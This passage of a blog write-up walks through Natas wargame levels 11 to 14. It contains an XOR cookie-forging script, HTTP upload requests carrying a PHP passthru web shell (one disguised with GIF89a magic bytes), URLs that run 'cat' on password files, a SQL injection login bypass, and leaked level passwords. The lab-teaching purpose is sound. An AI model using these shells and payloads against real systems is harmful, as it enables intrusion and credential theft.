</span><span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">xorKey</span> <span class="o">*</span> <span class="mi">11</span><span class="p">,</span> <span class="n">b</span><span class="s">'{"showpassword":"yes","bgcolor":"#ffffff"}  '</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'data'</span><span class="p">:</span> <span class="n">data</span><span class="p">})</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="n">i1</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">'The password for natas12 is '</span><span class="p">)</span>
<span class="n">i2</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">'&lt;br&gt;'</span><span class="p">,</span> <span class="n">i1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="n">i1</span><span class="p">:</span><span class="n">i2</span><span class="p">])</span>
</code></pre></div></div><p><em>Don’t use XOR for encryption. Ever.</em> <details> <summary>Spoiler</summary> natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 </details><h2 id="level-12"><a href="http://natas12.natas.labs.overthewire.org/">Level 12</a></h2><p><hy-img root-margin="512px" src="/assets/img/blog/natas/natas12-1.png" alt="Natas 12 landing page">  <noscript><img data-ignore src="/assets/img/blog/natas/natas12-1.png" alt="Natas 12 landing page"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img> We are met with an image upload code, and yet again, source code.<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span> 

<span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyz"</span><span class="p">;</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>    

    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nx">genRandomString</span><span class="p">()</span><span class="o">.</span><span class="s2">"."</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makeRandomPathFromFilename</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"filename"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">"upload"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"filename"</span><span class="p">]);</span>


        <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"File is too big"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"The file &lt;a href=</span><span class="se">\"</span><span class="nv">$target_path</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"There was an error uploading the file, please try again!"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"MAX_FILE_SIZE"</span> <span class="na">value=</span><span class="s">"1000"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"filename"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nx">genRandomString</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="s">.jpg"</span> <span class="nt">/&gt;</span>
Choose a JPEG to upload (max 1KB):<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"uploadedfile"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload File"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span> 
</code></pre></div></div><p>It seems we can upload files, restricted to jpeg, but the restriction seems “a bit” shady. Lets use burp suite to see if we can upload what we want. Start by uploading any file, then change the request in burp repeater:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas12.natas.labs.overthewire.org/
Content-Type: multipart/form-data; boundary=---------------------------761051921490452581253734734
Content-Length: 501
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="filename"

test.php
-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: text/php

<span class="cp">&lt;?php</span> <span class="k">echo</span><span class="p">(</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"test"</span><span class="p">]));</span><span class="cp">?&gt;</span>
-----------------------------761051921490452581253734734--
</code></pre></div></div><p>Resulting in <code class="highlighter-rouge">File uploaded successfully</code> and a link to the file. Now its just a matter of opening the url, view source, (to make output easier to read), and you have a poor mans browser shell to the server. Retrieve the password for the next level by opening the url <a href="view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13">view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13</a> ![natas12-2.png]. Read more on this vulnerability (Unrestricted file upload) on <a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">OWASP</a>. <em>Make sure to restrict file upload</em> <details> <summary>Spoiler</summary> natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY </details><h2 id="level-13"><a href="http://natas13.natas.labs.overthewire.org/">Level 13</a></h2><p><hy-img root-margin="512px" src="/assets/img/blog/natas/natas13-1.png" alt="Natas 13 landing page">  <noscript><img data-ignore src="/assets/img/blog/natas/natas13-1.png" alt="Natas 13 landing page"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img> We are met with an image upload code again, this time with restrictions, and yet again, source code.<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">For</span> <span class="nx">security</span> <span class="nx">reasons</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">now</span> <span class="nx">only</span> <span class="nx">accept</span> <span class="nx">image</span> <span class="nx">files</span><span class="o">!&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>

<span class="o">&lt;?</span> 

<span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">"0123456789abcdefghijklmnopqrstuvwxyz"</span><span class="p">;</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>    

    <span class="k">for</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$p</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nx">genRandomString</span><span class="p">()</span><span class="o">.</span><span class="s2">"."</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makeRandomPathFromFilename</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$fn</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">makeRandomPath</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"filename"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$target_path</span> <span class="o">=</span> <span class="nx">makeRandomPathFromFilename</span><span class="p">(</span><span class="s2">"upload"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"filename"</span><span class="p">]);</span>
    
    <span class="nv">$err</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$err</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$err</span> <span class="o">===</span> <span class="mi">2</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"The uploaded file exceeds MAX_FILE_SIZE"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"Something went wrong :/"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"File is too big"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"File is not an image"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'uploadedfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"The file &lt;a href=</span><span class="se">\"</span><span class="nv">$target_path</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$target_path</span><span class="s2">&lt;/a&gt; has been uploaded"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"There was an error uploading the file, please try again!"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"MAX_FILE_SIZE"</span> <span class="na">value=</span><span class="s">"1000"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"filename"</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nx">genRandomString</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="s">.jpg"</span> <span class="nt">/&gt;</span>
Choose a JPEG to upload (max 1KB):<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"uploadedfile"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="nt">/&gt;&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload File"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span>  
</code></pre></div></div><p>It seems we can upload images, restricted to jpeg. This time they have added an exif_imagetype check to see if it actually is an image. It’s quite easy to fool this check, so we are able to uplad what we want anyway. exif_imagetype only checks the first few <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic bytes</a> to see if this is an image, so we can just prepend our php file with these bytes, and bob’s your uncle.<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/
Content-Type: multipart/form-data; boundary=---------------------------5940814761936928397739684905
Content-Length: 513
Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="filename"

test.php
-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: text/php

GIF89a
<span class="cp">&lt;?php</span> <span class="k">echo</span><span class="p">(</span><span class="nb">passthru</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"test"</span><span class="p">]));</span><span class="cp">?&gt;</span>
-----------------------------5940814761936928397739684905--
</code></pre></div></div><p>Resulting in <code class="highlighter-rouge">File uploaded successfully</code> and a link to the file. Now its just a matter of opening the url, view source, (to make output easier to read), and you have a poor mans browser shell to the server, just as natas12 Retrieve the password for the next level by opening the url <a href="view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14">view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14</a> <em>Checking file type is not enough</em> <details> <summary>Spoiler</summary> natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 </details><h2 id="level-14"><a href="http://natas14.natas.labs.overthewire.org/">Level 14</a></h2><p><hy-img root-margin="512px" src="/assets/img/blog/natas/natas14-1.png" alt="Natas 14 landing page">  <noscript><img data-ignore src="/assets/img/blog/natas/natas14-1.png" alt="Natas 14 landing page"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img> We are met with a username/password login page, and sourcecode.<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"username"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'natas14'</span><span class="p">,</span> <span class="s1">'&lt;censored&gt;'</span><span class="p">);</span>
    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'natas14'</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
    
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * from users where username=</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2"> and password=</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"debug"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Executing query: </span><span class="nv">$query</span><span class="s2">&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"Access denied!&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
Username: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;</span>
Password: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?</span> <span class="p">}</span> <span class="cp">?&gt;</span> 
</code></pre></div></div><p>A <a href="https://en.wikipedia.org/wiki/Database">database</a> connection to <a href="https://www.mysql.com/">mysql</a> is established, then a <a href="https://en.wikipedia.org/wiki/SQL">SQL query</a> executed against the database. The query checks the username and password, and if it finds a result, we get the password we want. Otherwise we are denied. The glaring error on this page is <a href="https://www.owasp.org/index.php/SQL_Injection">SQL injection</a>. Use username <code class="highlighter-rouge">" OR 1=1 -- -</code> for instant win.<br /> <em>SQL injection flaws are more common than you think</em> <details> <summary>Spoiler</summary> natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J </details></div></article><hr class="dingbat related" /><aside class="about related mt4 mb4" role="complementary"><div class="author mt4"><h2 class="page-title hr"> About</h2><p>Part time vulnerability, bug and bounty hunter. Enjoy searching for and exploiting vulnerabilities on wargames and ctf’s. Will blog about my adventures in wargames, ctf’s, bounty hunts, vulnerability explorations, both ups and downs. Hopefully you can learn something by reading and subscribing to my blog.<div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/fjankk" title="Twitter" class="no-mark-external" rel="me"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/fjank" title="GitHub" class="no-mark-external" rel="me"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></aside><aside class="related mb4" role="complementary"><h2 class="hr">Related Posts</h2><ul class="related-posts"><li> <a href="/blog/2020-03-06-etjenesten-ctf/" class="h4 flip-title"><span>Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet</span></a> <time class="heading faded fine" datetime="2020-03-06T00:00:00+01:00">06 Mar 2020</time><li> <a href="/blog/2020-01-04-pst-chistmas-ctf/" class="h4 flip-title"><span>NPST utlyser en midlertidig stilling som snikende alvebetjent</span></a> <time class="heading faded fine" datetime="2020-01-04T00:00:00+01:00">04 Jan 2020</time><li> <a href="/blog/2019-11-18-adidas-smart-run/" class="h4 flip-title"><span>Adidas Smart Run</span></a> <time class="heading faded fine" datetime="2019-11-18T00:00:00+01:00">18 Nov 2019</time></ul></aside><aside class="comments related" role="complementary"><h2 class="hr">Comments</h2><div id="disqus_thread"></div><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> <script>!function(w, d) { if (d.getElementById("disqus_thread")) { if (w.DISQUS) { w.DISQUS.reset({ reload: true, config() { this.page.url = w.location.href; this.page.title = d.title; }, }); } else { w.disqus_config = function disqusConfig() { this.page.url = w.location.href; this.page.title = d.title; }; w.loadJSDeferred(d.getElementById("_hrefDisqus").href + '/embed.js'); } } }(window, document);</script></aside><footer role="contentinfo"><hr/><p><small class="copyright">© 2019. All rights reserved. </small><p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">8.5.2</span></small><hr class="sr-only"/></footer></main><hy-drawer class="" align="left" threshold="10" touch-events prevent-default ><header id="_sidebar" class="sidebar" role="banner"><div class="sidebar-bg sidebar-overlay" style="background-color:rgb(25,55,71);background-image:url(/assets/img/sidebar-bg.jpg)"></div><div class="sidebar-sticky"><div class="sidebar-about"><h2 class="h1"><a href="/">Fjanks security pages</a></h2><p class="fine"> A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security.</div><nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span><ul><li> <a id="_navigation" href="/about/" class="sidebar-nav-item" > About </a></ul></nav><div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/fjankk" title="Twitter" class="no-mark-external" rel="me"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/fjank" title="GitHub" class="no-mark-external" rel="me"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></header></hy-drawer><hr class="sr-only" hidden /> </hy-push-state> <!--[if gt IE 10]><!----> <script nomodule>!function(){var e=document.createElement("script");if(!("noModule"in e)&&"onbeforeload"in e){var t=!1;document.addEventListener("beforeload",function(n){if(n.target===e)t=!0;else if(!n.target.hasAttribute("nomodule")||!t)return;n.preventDefault()},!0),e.type="module",e.src=".",document.head.appendChild(e),e.remove()}}(); </script> <script type="module" src="/assets/js/hydejack-8.5.2.js"></script> <script nomodule src="/assets/js/hydejack-legacy-8.5.2.js" defer></script> <script>!function(w, d) { w.ga=w.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date; /**/ ga('create', 'UA-136398928-1', 'auto'); /**/ var pushStateEl = d.getElementsByTagName('hy-push-state')[0]; var timeoutId; pushStateEl.addEventListener('hy-push-state-load', function() { w.clearTimeout(timeoutId); timeoutId = w.setTimeout(function() { ga('set', 'page', w.location.pathname); ga('send', 'pageview'); }, 500); }); d.addEventListener('hy--cookies-ok', function () { w.ga(function(tracker) { w.ga("set", "anonymizeIp", undefined); localStorage && localStorage.setItem("ga--client-id", tracker.get("clientId")); }); }); w.loadJSDeferred('https://www.google-analytics.com/analytics.js'); }(window, document);</script> <!--<![endif]--><h2 class="sr-only" hidden>Templates (for web app):</h2><template id="_animation-template" hidden><div class="animation-main fixed-top"><div class="content"><div class="page"></div></div></div></template> <template id="_loading-template" hidden><div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span></div></template> <template id="_error-template" hidden><div class="page"><h1 class="page-title">Error</h1><p class="lead"> Sorry, an error occurred while loading <a class="this-link" href=""></a>.</div></template> <template id="_forward-template" hidden> <button id="_forward" class="forward nav-btn no-hover fl"> <span class="sr-only">Forward</span> <span class="icon-arrow-right2"></span> </button> </template> <template id="_back-template" hidden> <button id="_back" class="back nav-btn no-hover fl"> <span class="sr-only">Back</span> <span class="icon-arrow-left2"></span> </button> </template> <template id="_permalink-template" hidden> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="icon-link"></span> </a> </template></html>
